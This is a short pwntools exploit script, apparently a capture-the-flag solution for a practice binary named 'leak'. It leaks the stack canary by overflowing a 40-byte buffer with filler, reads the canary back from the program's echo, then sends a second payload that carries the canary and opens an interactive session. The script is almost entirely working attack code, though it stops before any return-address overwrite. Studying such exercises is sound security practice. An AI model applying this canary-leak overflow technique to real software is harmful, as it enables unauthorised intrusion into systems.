from pwn import *
# context.terminal = ["tmux", "split", "-h"]
# context.log_level = "debug" # shows payload

def main():
    elf = context.binary = ELF('./leak')

    #     Arch:     amd64-64-little
    #     RELRO:    Partial RELRO
    #     Stack:    Canary found
    #     NX:       NX enabled
    #     PIE:      PIE enabled

    # conn = remote('vuln.redrocket.club',2288)

    ############ EXPLOIT GOES HERE ###############

    conn = gdb.debug("./leak", gdbscript="""b *main continue""")

    conn.recvuntil("!")

    payload = "jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj"
    conn.sendline(payload)


    # new line
    output = conn.recvline()
    # echo
    echo = conn.recv()
    print("echo: ")
    print(echo)

    # cut \n at the end off
    canary = echo[41:].rstrip()

    # print canary
    print(canary)

    payload = b'A' * 40 + canary
    conn.sendline(payload)



    conn.interactive()


if __name__ == "__main__":
    main()